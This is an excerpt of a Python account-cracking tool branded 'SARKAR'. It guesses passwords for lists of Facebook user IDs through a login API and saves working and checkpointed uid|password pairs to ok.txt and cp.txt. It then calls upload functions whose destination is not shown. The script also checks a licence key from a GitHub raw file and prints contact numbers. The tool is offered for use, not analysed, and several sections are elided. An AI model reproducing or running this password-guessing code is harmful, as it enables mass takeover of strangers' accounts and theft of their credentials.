...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://pastebin.com/raw/3cNP2x7e.txt"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/hAraMi7890")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN🧞‍♀️ WATSAPPP🤲https:wa.me/+923159620940")
	subprocess.check_output(["am", "start", "https://wa.me/+03159620940"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/Shoaibsafi2/sarkar.py/main/Sar.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[1;36m
\033[1;35m
\033[41m\033[1;37m[SARKAR]   [SULEMAN]   [OSAMA]   [SHAYAN]\x1b[0m
\033[1;32m┌───────────────────────────────────────┐
\033[1;33m│ [✓] AUTHOR   : SARKAR\033[1;32m[RRSN]         │
\033[1;34m│ [✓] GITHUB   : \033[41m\033[1;37mSARKAR\x1b[0m           │
\033[1;35m│ [✓] WHATSAPP :  03159620940           │
\033[1;36m│ [✓] POWER SARKAR : \x1b[1;32mPRO PRONOY\x1b[1;97m           │
\033[1;32m└───────────────────────────────────────┘  
         \033[41m\033[1;37m𝐓𝐎𝐎𝐋 𝐀𝐃𝐌𝐈𝐍 [SARKAR] [BABA]\x1b[0m    
 """)
		print("%s [%s•%s] %sTOOL NAME : %sSARKAR❌ PROO CLONER❌"%(G,R,G,B,G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [SARKAR] : %s/%s -> \033[0;92m [ NAZIR-OK:%s ]- \033[0;91m[SARKAR-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [SARKAR-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[SARKAR-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [SARKAR-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
